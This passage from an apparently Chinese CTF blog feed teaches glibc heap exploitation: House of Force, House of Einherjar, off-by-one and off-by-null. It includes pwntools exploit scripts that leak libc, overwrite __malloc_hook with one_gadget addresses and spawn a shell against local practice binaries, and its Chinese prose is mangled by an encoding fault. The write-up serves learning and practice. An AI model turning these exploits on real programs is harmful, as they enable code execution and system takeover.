class="hljs-string">&quot;content\n&quot;</span>)<br>	p.send(content)<br>	<span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>å…¶å®çœ‹å®Œwikiï¼Œæ„Ÿè§‰å°±æ˜¯ offbyone&amp;null çš„åˆ©ç”¨æ–¹å¼ï¼Œå€Ÿç€æº¢å‡ºä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„in_useä½ç½®ï¼Œç„¶åé€ æˆunlinkåˆ¶é€ å‡ºå †å—é‡å ï¼Œæ‰€ä»¥å°±ä¸è¿‡å¤šä»‹ç»äº†ï¼Œçœ‹æˆ‘çš„ offbyone&amp;null è¿™ç¯‡åšå®¢æ˜¯ä¸€æ ·çš„ï¼Œè€Œä¸”æˆ‘è¿˜æ›´æ–°äº†æ–°ç‰ˆæœ¬çš„åˆ©ç”¨ï¼Œå½“ç„¶æ˜¯æ¥è‡ªå¤§ä½¬çš„ï¼Œæˆ‘æ˜¯ä¸ªæ¬è¿å·¥ğŸ‘¶</p>
<p>è¿‡ç¨‹ï¼š</p>
<ul>
<li>éœ€è¦æœ‰æº¢å‡ºæ¼æ´å¯ä»¥ä¿®æ”¹ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ prev_size ä¸ INUSE éƒ¨åˆ†ã€‚</li>
<li>åœ¨ç›®çš„ chunk é™„è¿‘æ„é€ ç›¸åº”çš„ fake chunkï¼Œä»è€Œç»•è¿‡ unlink çš„æ£€æµ‹ã€‚</li>
</ul>
<h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House_Of_Lore"></a>House_Of_Lore</h2><h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House_Of_Rabbit"></a>House_Of_Rabbit</h2>]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>offbyone&amp;null</title>
    <url>/2021/07/20/2021-07-26-offbyone&amp;null/</url>
    <content><![CDATA[<h1 id="offbyone"><a href="#offbyone" class="headerlink" title="offbyone"></a>offbyone</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>æ­£å¸¸æ¥è¯´ï¼Œæˆ‘ä»¬å¸Œæœ›ç¨‹åºçš„å †æº¢å‡ºèƒ½å¤Ÿæº¢å‡ºåˆ°next chunkçš„fdæˆ–è€…bkå­—æ®µï¼Œè¿›è€Œå®Œæˆåˆ©ç”¨ã€‚ä½†æ˜¯è¿™æ ·çš„æƒ…å†µæ˜¯å¾ˆå°‘çš„ï¼Œå› è€Œéœ€è¦ä¸€ç§æ›´åŠ å¸¸è§çš„ç‰¹æ®Šçš„å †æº¢å‡ºå½¢å¼â€”â€”offbyoneï¼Œæº¢å‡ºå­—èŠ‚å°±å¦‚ä»–çš„åå­—ä¸€æ ·ï¼Œåªèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚ã€‚å®é™…ç”Ÿæ´»ä¸­è¿™ç§æ¼æ´å¾ˆå¸¸è§ï¼Œç¨‹åºå‘˜å¾ˆå®¹æ˜“çŠ¯è¿™ç§é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯å› ä¸ºè¾¹ç•Œæ£€æŸ¥ä¸ä¸¥æ ¼ç­‰æƒ…å†µã€‚</p>
<p>æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿè¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”³è¯·ä¸ª0xn8å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆå¤šå‡ºçš„ä¸€ä¸ªå­—èŠ‚æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„sizeå­—æ®µï¼Ÿä¿®æ”¹äº†ä¹‹åï¼Œä¼šè®©ç¨‹åºè®¤ä¸ºè¿™ä¸ªå †å—çš„å¤§å°å°±æ˜¯ä½ ä¿®æ”¹çš„å¤§å°ï¼Œä»è€Œå¯¼è‡´overlap</p>
<p>å¦‚æœä½ åªæŠŠä¸€ä¸ªå †å—çš„sizeå˜å¤§ï¼Œç„¶åé‡Šæ”¾å†ç”³è¯·å‡ºæ¥ï¼Œæ‰©å¤§çš„sizeå°†ä¼šä»ä¸‹é¢çš„å †å—ä¸­å–æ¥ï¼Œå¹¶æŠŠé‡Œé¢çš„å†…å®¹æ¸…ç©ºï¼Œä¹Ÿå°±æ˜¯æƒ³è¦å†ä½¿ç”¨é‡Œé¢çš„å †å—ï¼Œéœ€è¦å»ä¿®å¤å¯¹åº”çš„å †å¤´ï¼ˆç”¨æ¥æ³„éœ²libcåŸºå€æ—¶ï¼Œéœ€è¦è¿™æ ·åˆ†å¼€æ¥æ“ä½œï¼‰</p>
<p>offbyoneæƒ…å½¢ï¼š</p>
<ul>
<li>strlenå‡½æ•°æŠŠnext chunkçš„sizeå­—æ®µä¹Ÿç»™è®¡å…¥è¿›å»ï¼Œé€ æˆæº¢å‡ºä¸€ä¸ªå­—èŠ‚</li>
</ul>
<p>åˆ©ç”¨æ–¹å¼ï¼šå †ä¸­æœ‰ABCDå››ä¸ªå·²ç»è¢«åˆ†é…çš„å¤§å°ä¸º0x70çš„chunkï¼Œç°åœ¨éƒ½æ˜¯ä½¿ç”¨çŠ¶æ€ã€‚ç„¶åAæ˜¯æˆ‘ä»¬è¿›è¡Œoffbyoneçš„chunkï¼Œæˆ‘ä»¬ç›®çš„æ˜¯å°†Bçš„sizeæ”¹æ‰ã€‚</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164209854.png" alt="image-20210726164209854" style="zoom: 80%;">

<p>æˆ‘ä»¬è¾“å…¥â€™Aâ€™*0x68 + â€˜\xe1â€™,æ­¤æ—¶ï¼Œå †å—çš„å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164413949.png" alt="image-20210726164413949" style="zoom:80%;">

<p>å¯ä»¥çœ‹åˆ°bçš„sizeè¢«æ”¹å¤§äº†ï¼Œæ­£å¥½è¦†ç›–åˆ°äº†cçš„æœ«å°¾ï¼Œæˆ‘ä»¬æ„é€ äº†chunkoverlapã€‚è¿™æ—¶å€™æˆ‘ä»¬å°†C freeæ‰ï¼Œä»–ä¼šè¿›å…¥fastbinã€‚æˆ‘ä»¬å†å°†B freeæ‰ï¼ŒB+Cè¿™ä¸€æ®µåŒºåŸŸä¼šè¿›å…¥unsorted binã€‚æˆ‘ä»¬å†æ¬¡ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º0xd0çš„å †å—ï¼Œä¹Ÿå°±æ˜¯è¯´B+Cè¿™æ®µå†…å­˜è¢«æˆ‘ä»¬æ§åˆ¶äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶Cçš„fdå­—æ®µï¼Œå°±å¯ä»¥è¿›è¡Œfastbin attackäº†ã€‚</p>
<p>å½“ç„¶ï¼Œå®è·µåº”ç”¨çš„æ—¶å€™ï¼Œå¹¶ä¸å±€é™è¯´å †å—å¤§å°éƒ½æ˜¯0x70ï¼Œ0x28ï¼Œ0x38éƒ½è¡Œï¼Œåªè¦èƒ½é€šè¿‡éªŒè¯å³å¯</p>
<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113130649.png" alt="image-20210726113130649"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œç„¶åè¿›å…¥idaçœ‹çœ‹ç¨‹åºä»£ç </p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726113232848.png" alt="image-20210726113232848"></p>
<p>æ¼æ´ç‚¹å­˜åœ¨ä¸editå‡½æ•°é‡Œé¢ï¼Œåœ¨strlenå‡½æ•°é‡Œé¢ï¼Œè¿™ä¸ªå‡½æ•°åªæœ‰é‡åˆ°â€™\x00â€™æ‰ä¼šåœæ­¢è®¡æ•°ï¼Œå¦‚æœæˆ‘ä»¬ç”³è¯·0x78çš„å †å—ï¼Œå¹¶ä¸”å¡«æ»¡0x78ä¸ªå­—ç¬¦ï¼Œç„¶ååœ¨è¿™ä¸ªå †å—ä¸‹é¢è¿˜å­˜åœ¨ä¸€ä¸ªå †å—ï¼Œé‚£strlenå°±ä¼šæŠŠä¸‹ä¸€ä¸ªå †å—çš„sizeå­—æ®µä¹Ÿç»™ç»Ÿè®¡è¿›å»ï¼Œä»è€Œå¯ä»¥å¤šè¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¿®æ”¹ä¸‹ä¸€å †å—çš„sizeå­—æ®µã€‚</p>
<p>é‚£ä¹ˆè¯¥æ€ä¹ˆæ„é€ å‘¢ï¼Ÿå…ˆç”³è¯·å››ä¸ª0x68çš„å †å—ï¼ˆè‡³å°‘å››ä¸ªï¼‰ç¬¬ä¸€ä¸ªç”¨æ¥ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„sizeå­—æ®µï¼Œç¬¬å››ä¸ªç”¨æ¥é˜²æ­¢ä¸top chunkåˆå¹¶ï¼Œä¸­é—´ä¸¤ä¸ªç”¨æ¥åˆ¶é€ overlap</p>
<p>æŠŠä¸‹ä¸€ä¸ªå †å—çš„sizeæ”¹ä¸ºä¸¤å€å¤§å°â€”â€”0xe1ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦è®©ç¨‹åºä¹Ÿè®¤ä¸ºè¢«ä¿®æ”¹çš„å †å—å¤§å°æ˜¯0xe0ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆåæŠŠç¬¬ä¸‰å—ã€ç¬¬äºŒå—éƒ½é‡Šæ”¾æ‰ï¼Œç¬¬ä¸‰å—è¿›å…¥fastbinï¼Œç¬¬äºŒå—ç”±äºsizeè¢«æ”¹åˆ™è¿›å…¥åˆ°unsortedbinä¸­ï¼Œå½»åº•è®©ç¨‹åºä»¥ä¸ºå¤§å°æ˜¯ä¸º0xe0ï¼Œæœ€ååªéœ€è¦æŠŠ0xe0çš„å †å—ç”³è¯·å‡ºæ¥ï¼Œå°±å¯ä»¥ä¿®æ”¹å…¶ä¸­æœ¬æ¥æ˜¯ç¬¬ä¸‰å—çš„fdæŒ‡é’ˆ</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164722535.png" alt="image-20210726164722535"></p>
<p>æˆåŠŸåˆ¶é€ äº†overlapï¼Œä¸¤ä¸ª0x70çš„å †å—åˆå¹¶äº†</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164617715.png" alt="image-20210726164617715"></p>
<p>å¾ˆæ˜æ˜¾çœ‹åˆ°ï¼ŒfdæŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦åˆ†é…chunkçš„åœ°æ–¹</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726164850626.png" alt="image-20210726164850626"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbyone&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>	p.send(content)	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>+p8(<span class="hljs-number">0xe1</span>))<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0xd0</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">4</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="offbynull"><a href="#offbynull" class="headerlink" title="offbynull"></a>offbynull</h1><h2 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>å…¶å®æœ¬è´¨ä¹Ÿæ˜¯ä¸€ç§offbyoneï¼Œåªæ˜¯è¿™ä¸ªæº¢å‡ºçš„å­—èŠ‚æˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼Œåªèƒ½æ˜¯0ã€‚æ‰€ä»¥æ„é€ æ–¹æ³•ä¼šä¸offbyoneæœ‰äº›ä¸åŒï¼Œä½†ç›®çš„éƒ½æ˜¯ä¸ºäº†åˆ¶é€ å‡ºoverlapï¼Œæ¯•ç«Ÿuafæ‰æ˜¯å †åˆ©ç”¨çš„æ ¸å¿ƒï¼</p>
<p>offbynullæƒ…å½¢ï¼š</p>
<ul>
<li>æŠŠä½ è¾“å…¥çš„å †å—çš„åœ°å€åŠ ä¸Šè¾“å…¥çš„å­—ç¬¦é•¿åº¦çš„åœ°æ–¹ç½®ä¸º0ï¼ˆä¸€èˆ¬æ¥è¯´æ²¡æˆ‘ä¸‹é¢çš„ä¾‹é¢˜é‚£ä¹ˆæ˜æ˜¾ï¼Œä¼šè¿›è¡Œå¾ˆå¤šè¿ç®—ä»¥åŠæ“ä½œï¼Œä½†æ˜¯æœ¬è´¨è¿˜æ˜¯ä¸€æ ·çš„ï¼‰</li>
</ul>
<p>æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿå› ä¸ºæº¢å‡ºçš„æ˜¯0ï¼Œæ‰€ä»¥æ˜æ˜¾åªèƒ½æŠŠä¿®æ”¹preinuseä½ä¿®æ”¹äº†ï¼Œæ‰€ä»¥è¿™è¾¹éƒ½æ˜¯ç”³è¯·0xf8å¤§å°çš„å †å—ï¼Œè¿™æ ·çš„å †å—åˆšå¥½ä¸º0x101ï¼Œæº¢å‡ºçš„0åªä¼šä¿®æ”¹preinuseï¼Œä¸ä¼šå½±å“å¤§å°</p>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
<p>abcdå››ä¸ªå¤§å°ä¸º0x100çš„å †å—ï¼Œéƒ½æ˜¯åœ¨ä½¿ç”¨çŠ¶æ€ï¼Œè¿™æ—¶å€™æˆ‘ä»¬çš„ç›®æ ‡å †å—æ˜¯Cå †å—</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170224084.png" alt="image-20210726170224084" style="zoom:80%;">

<p>æˆ‘ä»¬åœ¨Bä¸­è¾“å…¥ â€˜Aâ€™*0x90 + p64(0x200) + â€˜\x00â€™ï¼Œè¾“å…¥å®Œåå¸ƒå±€å°†ä¼šå˜åŒ–æˆè¿™æ ·</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170351639.png" alt="image-20210726170351639" style="zoom:80%;">

<p>æ­¤æ—¶ï¼ŒCçš„previnuseä½è¢«æ”¹æˆäº†0ï¼Œç¨‹åºä¼šå°†Bçœ‹ä½œå·²ç»è¢«é‡Šæ”¾çš„å †å—ã€‚ç„¶åç”±äºç³»ç»Ÿæ˜¯é€šè¿‡prevsizeä½æ¥å®šä½å‰ä¸€ä¸ªå †å—çš„ä½ç½®ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†å…¶æ”¹æˆäº†0x200,ä¹Ÿå°±æ˜¯è¯´å®šä½åˆ°äº†Aå †å—ã€‚ç„¶åå…ˆå°†A freeæ‰æ”¾å…¥unsortedbinï¼Œè¿™æ—¶å€™å†free Cï¼Œå°±ä¼šè§¦å‘åˆå¹¶æ“ä½œã€‚ABCå°†ä¼šè¢«çœ‹ä½œä¸€ä¸ªå¤§å°ä¸º0x300çš„å †å—æ”¾å…¥unsortedbinä¸­ã€‚ç„¶è€Œå®é™…ä¸Šï¼ŒBå¹¶æ²¡æœ‰è¢«freeï¼Œæˆ‘ä»¬ä¹Ÿå°±é€šè¿‡è¿™æ ·çš„æ–¹å¼æ„é€ äº†overlap</p>
<p>åœ¨å®é™…è¿ç”¨æ—¶ï¼Œä¸å±€é™éƒ½æ˜¯0x100çš„ï¼Œå¯ä»¥æ˜¯ä¸­é—´çš„æŸä¸ªå †å—æ˜¯fast chunkä¹Ÿè¡Œï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªåœ¨å¤´çš„å¿…é¡»ä¹Ÿå¾—æ˜¯unsorted chunkå¤§å°çš„å †å—ï¼Œå¦åˆ™è§¦å‘åˆå¹¶ä¼šå‡ºé—®é¢˜</p>
<h2 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726173924395.png" alt="image-20210726173924395"></p>
<p>çœ‹ç¨‹åºçš„addå‡½æ•°é‡Œé¢ï¼Œä¼šæŠŠè¾“å…¥çš„é•¿åº¦å¤šä¸€ä¸ªå­—èŠ‚çš„åœ°æ–¹ç½®ä¸º0</p>
<p>è¿™è¾¹æœ‰äº›å¥‡æ€ªï¼Œä¸æ‡‚ä¸ºä»€ä¹ˆï¼Œå¦‚æœåªæ˜¯ç”¨å››ä¸ªè¿›è¡Œæ„é€ ï¼Œå°†ä¼šæŠ¥é”™ï¼Œä½†æ˜¯äº”ä¸ªå°±è¡Œï¼Œç¬¬ä¸€ä¸ªæ˜¯ç”¨æ¥æ³„éœ²libcåŸºå€çš„ï¼Œä¸ç”¨ç†ä¼š</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174131814.png" alt="image-20210726174131814"></p>
<p>è¿™æ˜¯ä¿®æ”¹å®Œç›®æ ‡å †å—ï¼Œä»¥åŠé‡Šæ”¾äº†æŒ‡å‘çš„å †å—ï¼ˆç›®æ ‡å †å—å‡å»0x300ï¼‰</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174439990.png" alt="image-20210726174439990"></p>
<p>æœ€åæŠŠç›®æ ‡å †å—é‡Šæ”¾ï¼Œè§¦å‘åˆå¹¶ï¼Œå˜æˆäº†0x400çš„å †å—</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174611943.png" alt="image-20210726174611943"></p>
<p>ä¹‹åå°±æ˜¯æ„é€ å¤§å°ä¸º0x71çš„å †å—ï¼Œè¿™è¾¹æ„é€ å †å—è¦æ³¨æ„ï¼Œåœ¨è¢«æ„é€ çš„å †å—åé¢è¿˜è¦æ„é€ ä¸€ä¸ªå †å¤´ï¼Œå› ä¸ºéœ€è¦preinuseä½ç½®ä¸º1æ¥è¡¨ç¤ºæˆ‘ä»¬æ„é€ çš„å †å—æ˜¯è¢«ä½¿ç”¨çš„ï¼Œç„¶åæ‰èƒ½è¢«é‡Šæ”¾è¿›å…¥åˆ°fastbiné‡Œé¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbynull&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>	p.send(content)	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span 